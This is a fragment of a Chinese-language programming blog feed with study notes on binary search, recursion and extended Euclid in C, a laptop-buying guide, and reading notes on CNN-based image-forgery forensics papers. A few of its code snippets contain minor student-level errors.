<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">int</span> head, <span class="keyword">int</span> tail, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 边界条件</span></span><br><span class="line">    <span class="keyword">if</span> (head &gt; tail) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (head + tail) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (arr[mid] == x) <span class="keyword">return</span> mid;</span><br><span class="line">    <span class="keyword">if</span> (arr[mid] &lt; x) head = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> tail = mid - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> binary_search(arr, head, tail, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h1><p>斐波那契黄金分割查找</p>
<p>以前不行，自从 C99 标准之后，C 语言支持了变长<br><img src="binary-search/define-array.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 链接 静态 / 动态库</span></span><br><span class="line">gcc xx.c -lm</span><br></pre></td></tr></table></figure>
<p>枚举（构造）素勾股数（两两之间互素），用素勾股数枚举所有的勾股数<br>m，n 互素，对于 $a^2 + b^2 = c^2$ 有 </p>
<ul>
<li>$a = m^2 - n^2$</li>
<li>$b = 2 * m * n$</li>
<li>$c = m^2 + n^2$</li>
</ul>
]]></content>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>【C 语言基础】函数</title>
    <url>/2021/03/11/c-fundamental-function/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><details blue><summary> 【基本知识】函数 </summary>
              <div class='content'>
              <ol><li><p>三要素：</p><ul><li><code>int is_prime(int x)</code><ul><li>int：返回值，没有返回值用 void</li><li>is_prime：函数名，贴合实际用处</li><li>(int x)：参数声明列表</li></ul></li></ul></li><li><p>两大组成部分</p><ul><li>函数声明：<ul><li>向编译器声明是一个函数（编译器从主函数作为入口函数，按顺序进行编译），将函数定义放在调用之前，把函数声明当作定义放在前面</li><li>int is_prime(int);</li><li>可以重复声明</li></ul></li><li>函数定义：函数的三要素 + 花括号内实现功能<ul><li>不能重复定义，唯一</li></ul></li></ul></li><li><p>函数与数组的关系：映射</p><ul><li>函数是压缩的数组，数组是展开的函数：y = f(x)，arr[2] = 100</li></ul></li></ol>
              </div>
            </details>

<details blue><summary> 【基本知识】递归（套娃） </summary>
              <div class='content'>
              <h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><ol><li><p>递归：从程序调用自身的<strong>编程技巧</strong>，不是一种算法（递推是一种算法）</p></li><li><p>递归程序的组成部分：</p><ul><li>边界条件处理：避免出现死循环</li><li>针对于问题的<strong>处理过程</strong>和<strong>递归过程</strong></li><li>结果返回<ul><li>return 关键字</li><li>传出参数：当前参数接收的是地址 / 指针变量</li></ul></li><li>注意当前递归函数合理的<strong>语义信息</strong>的设定</li></ul></li><li><p>两大过程</p><ul><li>向下<strong>递推</strong>：函数调用</li><li>向上<strong>回归</strong>：回溯</li></ul></li><li><p>验证：数学归纳法</p></li><li><p>递归的背后：借助于系统栈（Linux 系统 8MB，Windows 系统 2MB）</p><ul><li>爆栈 / 栈溢出 / segment fault</li><li>原因：① 临时数组开太大，内存上的栈区放不下；② 函数调用层数过多</li><li>静态数组：通过类型直接定义的数组<code>int arr[10];</code>；当上述语句放在函数内部，放在栈区储存；放在函数外部，放在全局区存储</li><li>malloc / realloc / calloc 创造的数组存储在<strong>堆区</strong></li></ul></li></ol><h1 id="案例-→-n-的阶乘"><a href="#案例-→-n-的阶乘" class="headerlink" title="案例 → n 的阶乘"></a>案例 → n 的阶乘</h1><p>0! = 1：1! = 1，根据 1! = 1 * 0!，所以 0! = 1 而不是 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fac</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 递归出口 / 边界条件</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> n * fac(n - <span class="number">1</span>);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fac(%d) = %d\n&quot;</span>, n, fac(n));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="头递归-amp-尾递归"><a href="#头递归-amp-尾递归" class="headerlink" title="头递归 &amp; 尾递归"></a>头递归 &amp; 尾递归</h1><h1 id="欧几里德算法-辗转相除"><a href="#欧几里德算法-辗转相除" class="headerlink" title="欧几里德算法 / 辗转相除"></a>欧几里德算法 / 辗转相除</h1><h2 id="快速计算两个数字的最大公约数"><a href="#快速计算两个数字的最大公约数" class="headerlink" title="快速计算两个数字的最大公约数"></a>快速计算两个数字的最大公约数</h2><p><strong>gcd(a, b) = gcd(b, a % b)</strong> [大问题转化为小问题，迭代进行解决]</p><ul><li>假设 $gcd(a, b) = r$，证在 $b, a % b$ 中也包含 $r$，证明如下：<ul><li>有 $a = x * r，y = y * r(x, y \in Z，且 x、y 互素(gcd(x, y) = 1)，因为要保证 r 最大) $</li><li>$a % b = a - k * b(k \in Z) = x * r - k * y * r = r * (x - k * y)$，即证明了也包含 $r$</li></ul></li><li>证 $r$ 为最大，证明如下：<ul><li>由 $b = y * r，a % b = r * (x - k * y)$，要证明 $r$ 为最大，只需要证明 $y 与 (x - k * y)$ 互素</li><li>证 $gcd(y, x - k * y) = 1$，设 $gcd(y, x - k * y) = d$，只需证 $d \equiv 1$<ul><li>法一：设 $y = m * d，x - k * y = n * d(m, n \in Z)$ 则可得出 $y = m * d，x = n * d + k * y = n * d + k * m * d = d * (n + k * m)$，由于前面已知 $gcd(x, y) = 1$，所以 $d$ 只能为 1 才能保证 $x 与 y$ 互素</li><li>法二：重新表示 $a，b$ 可得 $a = r * d * (n + k * m)，b = r * m * d$，则可得 $gcd(a, b) \geq r * d$，又因为假设了 $r$ 为最大公约数，所以 $d 只能为 1$</li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// method 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 2 三目运算符（也需要进行预测）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (b ? gcd(b, a % b) : a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$ lcm(a, b) = \frac{a * b}{gcd(a, b)} $  </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lcm</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 防止乘法溢出</span></span><br><span class="line">    <span class="keyword">return</span> a / gcd(a, b) * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="【扩展欧几里得】快速求解-a-x-b-y-1-方程的一组整数解（a，b，x，y-均为整数）"><a href="#【扩展欧几里得】快速求解-a-x-b-y-1-方程的一组整数解（a，b，x，y-均为整数）" class="headerlink" title="【扩展欧几里得】快速求解 $a * x + b * y = 1$ 方程的一组整数解（a，b，x，y 均为整数）"></a>【扩展欧几里得】快速求解 $a * x + b * y = 1$ 方程的一组整数解（a，b，x，y 均为整数）</h2><ul><li><p>证明如果有整数值解，$a$，$b$ 一定互素，即 $gcd(a, b) = 1$</p><ul><li>设 $gcd(a, b) = c$，则有 $a = m * c, b = n * c(m, n 均为正整数)$，原式可化为 $m * c * x + n * c * y = 1$，即 $c * (m * x + n * y) = 1$，由于 $m * x + n * y$ 一定为整数，而 $c$ 不能为分数，则 $c$ 只能为 1</li></ul></li><li><p>若 $b = 0$，$a * x = 1$，则 $y 可以为任意值$，则 $a = 1, x = 1$ 或者 $a = -1, x = -1$</p><ul><li><p>而 $b = 0$ 相当于欧几里得算法迭代的最后流程，所以可以把大问题不断转化为小问题，即假设当前层的参数是 a 和 b ，则上一层的参数是 b 和 a % b，方程转化为 $b * x_{1} + (a % b) * y_{1} = 1$，展开为 $b * x_{1} + (a - k * b) * y_{1} = 1$，根据系数进行合并得 $a * y_{1} + b * y_{1}) = 1$</p></li><li><p>数学归纳法</p><ul><li><p>【回溯】第 k + 1 层的 x 值等于第 k 层的 y 值，第 k + 1 层的 y 值等于第 k 层的 x 值减去 k * 第 k 层的 y 值</p></li><li><p>【递归向下】但是第 k 层的 a 和 b 是第 k + 1 层的 b 和 a % b，最后达到递归边界</p><p>  <img src="./c-fundamental-function/exgcd.png"></p></li></ul></li></ul></li><li><p>扩展欧几里得：$a * x + b * y = gcd(a, b)$ 方程的整数值解</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ex_gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        *x = <span class="number">1</span>, *y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 向下调用</span></span><br><span class="line">    <span class="keyword">int</span> xx, yy, ret = ex_gcd(b, a % b, &amp;xx, &amp;yy);</span><br><span class="line">    <span class="comment">// 向上回溯</span></span><br><span class="line">    *x = yy;</span><br><span class="line">    *y = xx - a / b * yy;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ex_gcd_2</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        *x = <span class="number">1</span>, *y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 本层的 x 当成回溯上来的 y 值，即本层的 x 当作下层的 y 值传递下去</span></span><br><span class="line">    <span class="keyword">int</span> ret = ex_gcd(b, a % b, y, x);</span><br><span class="line">    <span class="comment">// 本层的 y 值是下一层 x 的值减去 k 倍的下一层的 y 值（此时为 x 的值）</span></span><br><span class="line">    y -= a / b * (*x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, b, x, y;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gcd(%d, %d) = %d\n&quot;</span>, a, b, ex_gcd(a, b, &amp;x, &amp;y));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d * %d + %d * %d = %d\n&quot;</span>, a, x, b, y, a * x + b * y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
              </div>
            </details>

<details blue><summary> 函数指针 </summary>
              <div class='content'>
              <p><code>把一个函数当成参数传递给另一个函数使用</code></p><ul><li>指针是一个变量（变量的本质是存值，变量类型就是为了存储不同的值），指针变量存储的值是地址，函数指针变量存的是函数地址</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int (*f1)(int)</span></span><br><span class="line"><span class="comment">// 意味着和上述相同，返回值为 int，参数列表为 int</span></span><br><span class="line"><span class="comment">// 分段函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">g</span><span class="params">(<span class="keyword">int</span> (*f1)(<span class="keyword">int</span>), <span class="keyword">int</span> (*f2)(<span class="keyword">int</span>), <span class="keyword">int</span> (*f3)(<span class="keyword">int</span>), <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> f1(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> f2(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f3(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PE-45（欧拉计划）函数指针的应用</p><p>满足三边形数、五边形数、六边形数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> int1;</span><br><span class="line"><span class="function">int1 <span class="title">Triangle</span><span class="params">(int1 n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n * (n + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">int1 <span class="title">Pentagonal</span><span class="params">(int1 n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n * (<span class="number">3</span> * n - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">int1 <span class="title">Hexagonal</span><span class="params">(int1 n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n * (<span class="number">2</span> * n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">int1 <span class="title">binary_search</span><span class="params">(int1 (*arr)(<span class="keyword">int</span>), <span class="keyword">int</span> n, int1 x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> head = <span class="number">1</span>, tail = n, mid;</span><br><span class="line">    <span class="keyword">while</span> (head &lt;= tail) &#123;</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr(mid) == x) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr(mid) &lt; x) head = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> tail = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">143</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        n++;</span><br><span class="line">        int1 temp = Hexagonal(n);</span><br><span class="line">        <span class="comment">// 是六边形数一定是三角形数，所以下面语句可以注释</span></span><br><span class="line">        <span class="keyword">if</span> (!binary_search(Triangle, temp, temp)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!binary_search(Pentagonal, temp, temp)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, temp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
              </div>
            </details>


<details blue><summary> 变参函数 </summary>
              <div class='content'>
              
              </div>
            </details>

<p>++i 比 i++ 速度快，但是可以忽略不计</p>
<ul>
<li>数据表示：大整数</li>
</ul>
]]></content>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机选购</title>
    <url>/2021/01/19/computer/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="游戏本"><a href="#游戏本" class="headerlink" title="游戏本"></a>游戏本</h1><p>显卡1660Ti以上的可以满足大型单机的需求，RTX2060以上可以满足小规模机器学习训练 </p>
<p><strong>全能笔记本电脑：</strong>适合对于轻薄有要求，但是需要在3D方面有部分提高，可以胜任一些3D的学习环境要求，也可以满足较多的游戏需求（非极限），比如LOL这类没有特别要求显卡性能的游戏都可以。这类笔记本一般提高显卡，价格在4500-7500区间，中位数5500。</p>
<p><strong>游戏笔记本电脑：</strong>除了大部分游戏需求，也适合3D方面要求较高的专业，以及对于游戏需求（比如3A级游戏大作），产品的价格一般较高。入门游戏本，采用1650ti显卡，基本5000-6500元区间，2060显卡中端游戏本基本7000-9000，而2070以上显卡的笔记本基本过万，2021年的3000系列显卡笔记本电脑基本会在8000起步。</p>
<p>NV家独立显卡的系列名称，GTX强于GT强于MX。</p>
<p>游戏要多看看笔记本屏幕的刷新频率（一般都是60hz），但是游戏建议144Hz，有钱买200Hz的，不然你显卡跑120FPS，你显示器根本没有来得及刷新，白瞎了显卡</p>
<hr>
<p>AMD 4800H</p>
<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p>显卡天梯图：<a href="https://zhuanlan.zhihu.com/p/133845310">https://zhuanlan.zhihu.com/p/133845310</a></p>
<p>笔记本电脑选购指南：<a href="https://zhuanlan.zhihu.com/p/84580494">https://zhuanlan.zhihu.com/p/84580494</a></p>
<p>联想：<a href="https://zhuanlan.zhihu.com/p/197927095">https://zhuanlan.zhihu.com/p/197927095</a></p>
]]></content>
  </entry>
  <entry>
    <title>数字图像篡改取证</title>
    <url>/2021/01/16/digital-images-forensic/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="阅读文献"><a href="#阅读文献" class="headerlink" title="阅读文献"></a>阅读文献</h1><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><table>
<thead>
<tr>
<th>term</th>
<th>explanation</th>
</tr>
</thead>
<tbody><tr>
<td>pixel</td>
<td>像素，图像的基本单位，一张图片是由一个个pixel组成</td>
</tr>
<tr>
<td>patch</td>
<td>块，每个patch都是由好多个pixel组成的</td>
</tr>
</tbody></table>
<h2 id="🧨Forensic-Similarity-for-Digital-Images"><a href="#🧨Forensic-Similarity-for-Digital-Images" class="headerlink" title="🧨Forensic Similarity for Digital Images"></a>🧨Forensic Similarity for Digital Images</h2><h3 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h3><p>项目地址：<a href="https://gitlab.com/MISLgit/forensic-similarity-for-digital-images">https://gitlab.com/MISLgit/forensic-similarity-for-digital-images</a></p>
<h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><ul>
<li>目的：<strong>forensic similarity</strong>➡<strong>two image patches</strong> contain the same forensic trace or different <strong>forensic traces</strong></li>
<li>应用<ul>
<li>forgery detection 伪造检测</li>
<li>❓localization 本地化 </li>
<li>❓database consistency verification 数据库一致性检测</li>
</ul>
</li>
<li>方法<ul>
<li>将成对的图像块映射到一个分数</li>
<li>基于CNN的<strong>特征提取器feature extractor</strong> + 相似性网络(三层神经网络)</li>
</ul>
</li>
<li>评估<ul>
<li>determining whether two image patches were captured by the same or different camera model</li>
<li>were manipulated by the same or different editing operation, and</li>
<li>were manipulated by the same or different manipulation parameter, given a particular editing operation.</li>
</ul>
</li>
<li>原理<ul>
<li>detect the visually imperceptible <strong>traces or fingerprints</strong> that are intrinsically introduced by <strong>a particular processing operation</strong></li>
</ul>
</li>
</ul>
<h3 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h3><ul>
<li><p>前人缺点</p>
<ul>
<li>[需要先验]require <strong>prior</strong> training examples from a <strong>particular</strong> forensic trace / many deep learning systems assume a <strong>closed</strong> set of forensic traces<ul>
<li>close set的缺点:系统会将这个新的“未知”trace错误分类为Y(用于训练系统的已知法医痕迹的空间,包含camera models和editing operations)中的“已知”trace,从而检测错误</li>
</ul>
</li>
</ul>
</li>
<li><p>[过于精确]many forensic investigations <strong>do not require explicit</strong> identification of a particular forensic trace</p>
</li>
<li><p>本文的改进</p>
<ul>
<li><strong>open</strong> set</li>
<li>not explicitly identify the particular forensic traces contained in an image patch, just whether they are <strong>consistent</strong> across two image patches</li>
</ul>
</li>
<li><p>forensic similarity system</p>
<ul>
<li>feature extractor<ul>
<li>use CNN to extract <u>general low-dimensional forensic features(deep features)</u> from an image patch</li>
<li>$ f : X → R^N $<ul>
<li>将图像块X映射到实数值N维特征空间</li>
<li>特征空间encode图像块X的high-level forensic information</li>
<li>convolutional neural networks (CNNs) are powerful tools for extracting general, high-level forensic information from image patches</li>
</ul>
</li>
</ul>
</li>
<li>a three layer neural network<ul>
<li>map pairs of these deep features onto a similarity score</li>
<li>$ S : R^N× R^N→ [0,1]$<ul>
<li>将两对forensic feature vectors映射到一个范围为0到1的相似度分数</li>
<li>低相似度分数表明两个图像块X1和X2具有不同的取证痕迹，而高相似度分数表明两个取证痕迹高度相似</li>
</ul>
</li>
<li>最后，将两个图像块X1和X2的相似性得分$ S(f(X1), f(X2)) $与阈值η进行比较</li>
</ul>
</li>
</ul>
</li>
<li><p>forensic trace </p>
<ul>
<li>source camera model / manipulation type / editing parameter</li>
<li>①the camera model that captured the image;②the social media website where the image was downloaded from;③the processing history of the image</li>
<li>inherently unrelated to the perceptual content of the image</li>
</ul>
</li>
<li><p><strong>Siamese network</strong></p>
</li>
</ul>
<h3 id="FORENSIC-SIMILARITY"><a href="#FORENSIC-SIMILARITY" class="headerlink" title="FORENSIC SIMILARITY"></a>FORENSIC SIMILARITY</h3><blockquote>
<p>motivate and formalize the concept of forensic similarity</p>
</blockquote>
<ol>
<li>输入：图像块X1和X2</li>
<li>一个特征提取器将两个输入映射到一对特征向量f(X1)和f(X2)，它对有关图像块的high-level forensic information进行编码</li>
<li>相似度函数将这<u>两个特征向量(该阶段的输入)</u>映射到相似度分数，然后将其与阈值进行比较。<ul>
<li>阈值以上的相似性分数表示X1和X2具有相同的取证轨迹（例如处理历史或源相机模型）</li>
<li>阈值以下的相似性分数表明它们具有不同的取证轨迹</li>
</ul>
</li>
</ol>
<p><img src="digital-images-forensic%5Ctif19-forensic-similarity.png" alt="forensic similarity system"></p>
<p><img src="digital-images-forensic%5Ctif19-forensic-similarity-1.png" alt="detailed-forensic similarity system"></p>
<h3 id="PROPOSED-APPROACH"><a href="#PROPOSED-APPROACH" class="headerlink" title="PROPOSED APPROACH"></a>PROPOSED APPROACH</h3><blockquote>
<p>detail proposed deep-learning system implementation and training procedure.</p>
<p>describe how to build and train the CNN-based feature extractor and similarity network</p>
</blockquote>
<ul>
<li>patch selection</li>
</ul>
<h3 id="EXPERIMENTAL-EVALUATION"><a href="#EXPERIMENTAL-EVALUATION" class="headerlink" title="EXPERIMENTAL EVALUATION"></a>EXPERIMENTAL EVALUATION</h3><blockquote>
<p>evaluate the effectiveness of our proposed approach in a number of forensic situations, and importantly effectiveness on unknown forensic traces</p>
</blockquote>
<ul>
<li><p>Source Camera Model Comparison</p>
<p><img src="digital-images-forensic%5CSourceCameraModelComparison.png" alt="Source Camera Model Comparison"></p>
<ul>
<li>Patch Size and Re-Compression Effects</li>
<li>compare with other approaches</li>
<li>impact of training procedure → unfrozen / update + subset / diverse dataset</li>
<li>architecture variants<ul>
<li>green channel → full color</li>
</ul>
</li>
</ul>
</li>
<li><p>Editing Operation Comparison</p>
</li>
<li><p>Editing Parameter Comparison</p>
</li>
</ul>
<h3 id="PRACTICAL-APPLICATIONS"><a href="#PRACTICAL-APPLICATIONS" class="headerlink" title="PRACTICAL APPLICATIONS"></a>PRACTICAL APPLICATIONS</h3><blockquote>
<p>demonstrate the utility of this approach in two practical applications.</p>
</blockquote>
<ul>
<li>image forgery detection and localization<ul>
<li>localization：<ul>
<li>选择原图作为参考补丁，则不一致的是拼接图</li>
<li>选择拼接图为参考补丁，则不一致的是原图，我理解为“双向定位”</li>
</ul>
</li>
</ul>
</li>
<li>image database consistency verification<ul>
<li>看着这个数据库是不是由同一个相机生成的照片构成</li>
</ul>
</li>
</ul>
<h3 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h3><hr>
<h2 id="🧨Noiseprint-a-CNN-based-camera-model-fingerprint"><a href="#🧨Noiseprint-a-CNN-based-camera-model-fingerprint" class="headerlink" title="🧨Noiseprint: a CNN-based camera model fingerprint"></a>🧨Noiseprint: a CNN-based camera model fingerprint</h2><h3 id="运行项目-1"><a href="#运行项目-1" class="headerlink" title="运行项目"></a>运行项目</h3><p>项目地址：<a href="https://github.com/grip-unina/noiseprint">https://github.com/grip-unina/noiseprint</a></p>
<p>jpeg压缩的质量因子要求51~101</p>
 <img src="digital-images-forensic\cuda-error.png" alt="img" style="zoom: 50%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow.compat.v1 <span class="keyword">as</span> tf</span><br><span class="line">tf.disable_v2_behavior()</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python main_blind.py dog1.png mat ou.jpg</span><br><span class="line">python main_map2uint8.py mat.npz test.png</span><br><span class="line">python main_showres.py dog1.png dog1.png mat.npz</span><br></pre></td></tr></table></figure>
<p>python os join path的问题：<a href="https://blog.csdn.net/weixin_37895339/article/details/79185119">https://blog.csdn.net/weixin_37895339/article/details/79185119</a></p>
<h3 id="Abstract-1"><a href="#Abstract-1" class="headerlink" title="Abstract"></a>Abstract</h3><blockquote>
<p>extract <u>a camera model fingerprint → noiseprint</u></p>
<p>image forgery localization</p>
</blockquote>
<p>noise residual 噪声残差</p>
<p>siamese networks 暹罗网络</p>
<h3 id="INTRODUCTION-1"><a href="#INTRODUCTION-1" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h3><p><strong>any acquisition device leaves on each captured image distinctive traces</strong></p>
<ul>
<li><p>statistical methods, based on <code>pixel-level</code> analyses of the data 基于数据的像素级分析的统计方法</p>
<ul>
<li>a model-based approach：建立一些特定特征的数学模型，并将其用于法医目的<ul>
<li>popular targets<ul>
<li>lens aberration</li>
<li>camera response function</li>
<li>color filter array(CFA)</li>
<li>JPEG artifacts</li>
</ul>
</li>
<li>缺点：适用范围窄</li>
</ul>
</li>
<li>a data-driven approach<ul>
<li>noise residual<ul>
<li>概念：the noise-like signal which remains once the high-level semantic content has been removed</li>
<li>如何获取：<ul>
<li>①从图像中减去通过降噪算法(denoising algorithms)估计的“干净”版本</li>
<li>②通过在空间或变换（傅里叶，DCT，小波）域中应用一些高通滤波器</li>
</ul>
</li>
<li>PRNU-based methods的缺点<ul>
<li>the need of a large number of images taken from the camera to obtain good estimates</li>
<li>the low power of the signal of interest with respect to noise<ul>
<li>主要的噪声源是高级图像内容，由于不完善的过滤，该图像内容在PRNU中泄漏</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>通过提取noiseprint可以发现被篡改的图片中的不一致性</p>
<p><img src="digital-images-forensic%5Cnoiseprint-inconsistency.png" alt="1611413292011"></p>
</li>
</ul>
<blockquote>
<p>propose a new method to extract <u>a noise residual → noiseprint</u></p>
</blockquote>
<p>noiseprint shows clear traces of camera artifacts</p>
<h3 id="RELATED-WORK"><a href="#RELATED-WORK" class="headerlink" title="RELATED WORK"></a>RELATED WORK</h3><blockquote>
<p>analyze related work on noise residuals to better contextualize our proposal</p>
</blockquote>
<ul>
<li>Exploiting noise for image forensics 利用噪声进行图像取证<ul>
<li>unsupervised methods</li>
<li>intrinsic fingerprint</li>
</ul>
</li>
<li>Using deep learning for image forensics<ul>
<li>缺点：rely on a training dataset strongly aligned with the test set</li>
</ul>
</li>
</ul>
